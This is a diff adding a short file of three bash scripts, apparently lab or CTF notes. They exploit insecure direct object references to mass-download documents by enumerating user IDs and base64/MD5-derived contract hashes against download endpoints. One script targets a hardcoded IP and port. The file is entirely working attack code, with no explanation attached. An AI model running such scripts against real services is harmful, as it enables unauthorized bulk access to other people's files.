@@ -1,0 +1,37 @@
+############################################## MASS DOWNLOAD ###############################################################
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+
+
+
+############################################## ENCODED MASS DOWNLOAD ###############################################################
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+
+
+
+############################################## GET MASS DOWNLOAD (LIST) ###############################################################
+
+#!/bin/bash
+
+BASE_URL="http://154.57.164.67:31611/download.php"
+INPUT_FILE="liste.txt"
+
+while IFS= read -r contract || [[ -n "$contract" ]]; do
+  echo "Lade Vertrag: $contract"
+  
+    curl -f "${BASE_URL}?contract=${contract}" -o "${contract}.dat"
+    
+done < "$INPUT_FILE"
